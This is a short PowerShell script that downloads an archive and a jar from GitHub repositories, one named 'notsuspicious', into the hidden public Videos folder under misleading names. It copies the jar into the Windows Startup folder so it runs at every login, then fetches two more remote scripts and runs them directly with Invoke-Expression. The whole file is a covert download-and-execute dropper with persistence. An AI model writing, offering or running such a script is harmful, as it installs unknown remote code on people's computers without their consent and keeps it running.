Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/archive/refs/heads/main.zip' -OutFile 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
Expand-archive 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip' 'C:\Users\Public\Videos'
Rename-Item 'C:\Users\Public\Videos\Server-main' 'GraphicalUserInterface'
Remove-Item 'C:\Users\Public\Videos\DoWindowsGraphicalUserInterface.zip'
Expand-archive 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip' 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6'
Remove-Item 'C:\Users\Public\Videos\GraphicalUserInterface\myapp\jre6\lib.zip'
Invoke-WebRequest https://github.com/RaupenInspektor/notsuspicious/raw/main/downloadnew.jar -OutFile C:\Users\Public\Videos\downloadnew.jar -UseBasicParsing
$sourceFile = "C:\Users\Public\Videos\downloadnew.jar"
$destinationFolder = [Environment]::GetFolderPath("Startup")
Copy-Item -Path $sourceFile -Destination $destinationFolder
Remove-Item -Path C:\Users\Public\Videos\downloadnew.jar -Force
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing).Content
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/move.ps1" -UseBasicParsing).Content
